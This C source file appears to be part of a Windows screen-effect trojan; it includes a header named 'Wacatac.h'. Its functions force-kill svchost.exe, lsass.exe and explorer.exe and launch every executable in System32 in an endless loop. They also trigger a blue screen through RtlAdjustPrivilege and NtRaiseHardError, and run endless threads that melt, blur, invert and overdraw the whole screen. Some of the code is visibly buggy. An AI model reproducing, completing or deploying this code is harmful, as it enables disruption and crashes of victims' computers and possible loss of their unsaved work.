typedef struct IUnknown IUnknown;
#pragma once

#include "Wacatac.h"
#include "System.h"
#include "Defines.h"

void KillCriticalProcesses(void)
{
	system("taskkill /f /im svchost.exe");
	Sleep(3000);
	system("taskkill /f /im lsass.exe");
	Sleep(3000);
	system("taskkill /f /im explorer.exe");
	Sleep(4000);
}

void ProgramOpener(void)
{
  WIN32_FIND_DATAW lpFindFileData;
  while (TRUE)
  {
    LPCWSTR lpFileName = L"C:\\WINDOWS\\System32\\*.exe";
    HANDLE hFindFile = FindFirstFileW(lpFileName, &lpFindFileData);
    if (lpFileName != L"logoff.exe" || L"shutdown.exe") {
      while (FindNextFileW(hFindFile, &lpFindFileData)) {
        ShellExecuteW(NULL, L"open", lpFindFileData.cFileName, NULL, NULL, SW_SHOWDEFAULT);
        Sleep(10000);
      }
    }
  }
}

void BlueScreenOfDeath(void)
{
    BYTE ntByte;
	DWORD ntResponse;
	RtlAdjustPrivilege(19, true, false, &ntByte);
	NtRaiseHardError(0xc0000147, 0, 0, 0, 6, &ntResponse);
	Sleep(-1);
}

DWORD WINAPI RGBQUAD1(LPVOID lpvd)
{
		while (true) 
		{
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { sizeof(BITMAPINFO), w, h, 1, 32 }, 0 };
			PTRGBQUAD rgbq;
			HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (LPVOID*)&rgbq, NULL, 0);
			SelectObject(mdc, hbit);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
				for (int t = 0; t < w * h; t++) {
					int x = t % w, y = t / w;
					rgbq[t].red += x&y;
					rgbq[t].green += x&y;
					rgbq[t].blue += x&y;
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
				Sleep(1);
		  }
	 }
 }

DWORD WINAPI Sphere(LPVOID lpvd)
{
		INT x = w / 2, y = h / 2;
		INT incr = 10, incr2 = 10;
		INT rad = 100;
		FLOAT spd = 0.01f;
		FLOAT ax = 0.f, ay = 0.f, az = 0.f;
		INT clr = 1;
		while (TRUE) 
		{
			HDC hdc = GetDC(0);
			POINT3D pc = {x, y, 0.f};
			Sphere(hdc, pc, rad, ax, ay, az, clr);
			x += incr, y += incr2;
			if (x - rad < 0 || x + rad > w) incr = -incr;
			if (y - rad < 0 || y + rad > h) incr2 = -incr2;
			ax += spd, ay += spd, az += spd;
			if (clr < 255) clr++;
			Sleep(5);
			incrementB++;
		}
		return 0x01;
}

DWORD WINAPI RGBQUAD2(LPVOID lpvd)
{
		while (true) 
		{
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { sizeof(BITMAPINFO), w, h, 1, 32 }, 0 };
			PTRGBQUAD rgbq;
			HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (LPVOID*)&rgbq, NULL, 0);
			SelectObject(mdc, hbit);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
				for (int i = 0; i < w * h; i++) {
					int x = i % w, y = i / w;
					int cx = x - (w / 2);
			        int cy = y - (h / 2);
					int zx = (cx * cx);
					int zy = (cy * cy);
					int di = 128.0 + i;
                    int fx = di ^ (di ^ abs(sqrt(zx + zy) / 3.0));
                    rgbq[i].red += fx+i;
                    rgbq[i].green += fx+i;
                    rgbq[i].blue += fx+i;
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
				Sleep(1);
		  }
	 }
}

DWORD WINAPI Wef1(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	while (TRUE) {
		INT size = 500;
		HRGN rgn;
		INT x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (INT i = 4; i < size; i += 50) {
			// Redefining. What's wrong with it?
			rgn = CreateEllipticRgn(x - i / 2, y - i / 2, i + (x - i / 2), i + (y - i / 2));
			SelectClipRgn(hdc, rgn);
			StretchBlt(hdc, x - i / 2, y - i / 2, i, i, hdc, x - i / 2, y - i / 2, w, h, PATINVERT);
			Sleep(5);
		}
		x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (INT i = 4; i < size; i += 50) {
			rgn = CreateRectRgn(x - i / 2, y - i / 2, i + (x - i / 2), i + (y - i / 2));
			SelectClipRgn(hdc, rgn);
			StretchBlt(hdc, x - i / 2, y - i / 2, i, i, hdc, x - i / 2, y - i / 2, w, h, PATINVERT);
			Sleep(5);
		}
		x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (INT i = 4; i < size; i += 50) {
			POINT pptl[3] = {
				x, y - i / 2,
				x - i / 2, y + i / 2,
				x + i / 2, y + i / 4
			};
			rgn = CreatePolygonRgn(pptl, 3, WINDING);
			SelectClipRgn(hdc, rgn);
			StretchBlt(hdc, x - i / 2, y - i / 2, i, i, hdc, x - i / 2, y - i / 2, w, h, PATINVERT);
			Sleep(5);
		}
		if (rand() % 30 == 29) RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(10);
	}
}

DWORD WINAPI BouncingTriangle(LPVOID lpvd)
{
		HDC hdc;
		HBRUSH hbsh;
		int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
		int incrementation = 10;
		int x = 10, y = 10;
		while (1) {
			hdc = GetDC(0);
			x += incrementation * sx;
			y += incrementation * sy;
			POINT vpt[] = {{x+90, y+90}, {x+90, y+90}, {x+90, y+95}};
			hbsh = CreateSolidBrush(Colorspect(incB));
			SelectObject(hdc, hbsh);
			Polygon(hdc, vpt, sizeof(vpt)/sizeof(vpt[0]));
			if (y >= GetSystemMetrics(1)) 
			{
				sy = -1;
			}
			if (x >= GetSystemMetrics(0))
		    {
				sx = -1;
			}
			if (y == 0)
			{
				sy = 1;
			}
			if (x == 0) 
			{
				sx = 1;
			}
			incB += M_PI / 3;
			DeleteObject(hbsh);
			Sleep(10);
	}
}

DWORD WINAPI Blur1(LPVOID lpvd) 
{ 
	HDC hdc;
	int size = 2000;
	while (true) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < 30; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 17 - 8, y + rand() % 17 - 8, SRCCOPY);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
        Sleep(10);
		DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
	}
}

DWORD WINAPI Melt(LPVOID lpvd)
{ 
	HDC hdc;
	int size = 2000;
	while (true) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < 30; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 17 - 8, y + rand() % 17 - 8, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
        Sleep(10);
		DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
	}
}

DWORD WINAPI Gradients1(LPVOID lpvd)
{
    while (true) 
	{
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        TRIVERTEX vtx[3];
        vtx[0].x = rand() % w; vtx[0].y = rand() % h;
        vtx[1].x = rand() % w; vtx[1].y = rand() % h;
        vtx[2].x = rand() % w; vtx[2].y = rand() % h;
        vtx[0].Red = 0; vtx[0].Green = 0; vtx[0].Blue = 0; vtx[0].Alpha = 0xff00;
        vtx[1].Red = 0x7f80; vtx[1].Green = 0; vtx[1].Blue = 0; vtx[1].Alpha = 0xff00;
        vtx[2].Red = 0xff00; vtx[2].Green = 0; vtx[2].Blue = 0; vtx[2].Alpha = 0xff00;
        GRADIENT_TRIANGLE gt;
        gt.Vertex1 = 0; gt.Vertex2 = 1; gt.Vertex3 = 2;
        GdiGradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

